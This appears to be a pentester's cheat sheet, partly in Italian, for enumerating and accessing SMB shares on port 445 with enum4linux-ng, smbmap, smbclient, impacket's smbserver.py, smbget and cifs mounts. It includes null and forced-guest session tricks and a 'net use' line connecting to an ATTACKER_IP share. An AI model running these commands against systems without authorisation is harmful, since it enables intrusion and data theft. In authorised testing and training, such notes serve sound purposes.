Port 445 TCP

# Tools

## enum4linux-ng
```bash
#Full, force guest session with wrong credentials
enum4linux-ng 89.108.102.21 -A -R -u 'g' -p 'h'

#Full, use on DC
enum4linux-ng 89.108.102.21 -A -R -d -u 'g' -p 'h'

#Stealthier, No RID bruteforcing
enum4linux-ng 89.108.102.21 -As

```

## smbmap
```bash
#Force guest session with wrong credentials
smbmap -H 89.108.102.21 -u 'h' -p 'h'

#Anonymous Session
smbmap -H 89.108.102.21 

#Stealthier, No RID bruteforcing
enum4linux-ng 89.108.102.21 -As

```

## smbclient
Sometimes servers are configured in a way that standard shares enumeration techniques (such as the ones used by enum4linux or smbmap) don't work.
smbclient uses a different approach ad it's worth trying if you suspect a null session is achievable.

```bash

#Null session directory listing 
smbclient -N -L \\\\172.16.27.132
#Interactive mode (Null)
smbclient -N \\\\172.16.27.132\\C$


#User directory listing
smbclient -L \\\\172.16.27.132 -U 'administrator'
smbclient \\\\172.16.27.132\\C$ -U administrator

```

## smbserver.py

```bash
#con auth
sudo smbserver.py k . -username 'kek' -password 'kek123!'  -smb2support 

# no auth smb1
sudo smbserver.py k . 
```

piccola considerazione se `net use`:
Se ho una shell con utente di cui non so la psw e non accetta smb1 p smb2 unauth, posso usare il comando net per collegarmi alla shell SPECIFICANDO LE CREDENZIALI!

```powershell
net use \\ATTACKER_IP\share /USER:user s3cureP@ssword
```


## Download Files

```bash
#Scarica TUTTI i files nella cartella
smbget -R smb://192.168.212.71/backups  
```

# Mounting
`sudo apt install cifs-utils `

Then

```bash
#Anonymous login (submit a random psw when asked)
sudo mount -t cifs //10.129.136.29/Backups ~/pentests/HTB/Bastion/mount/ -o rw

#User login (NOT SURE)
sudo mount -t cifs user@//10.129.136.29/Backups ~/pentests/HTB/Bastion/mount/ -o rw

```